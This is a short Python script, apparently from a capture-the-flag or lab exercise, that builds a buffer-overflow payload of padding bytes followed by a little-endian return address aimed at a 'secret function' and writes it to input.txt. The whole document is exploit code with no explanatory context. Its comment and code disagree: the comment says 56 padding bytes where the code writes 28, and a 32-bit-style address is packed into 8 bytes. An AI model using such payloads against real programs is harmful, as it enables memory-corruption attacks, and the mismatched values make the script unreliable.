# buffer_overflow_payload.py

# Address to jump to (e.g., secret function)
address = 0x080492ba

# Create payload: 56 'A's + 8-byte little-endian address
payload = b"A" * 28 + address.to_bytes(8, 'little')

# Write to file
with open("input.txt", "wb") as f:
    f.write(payload)
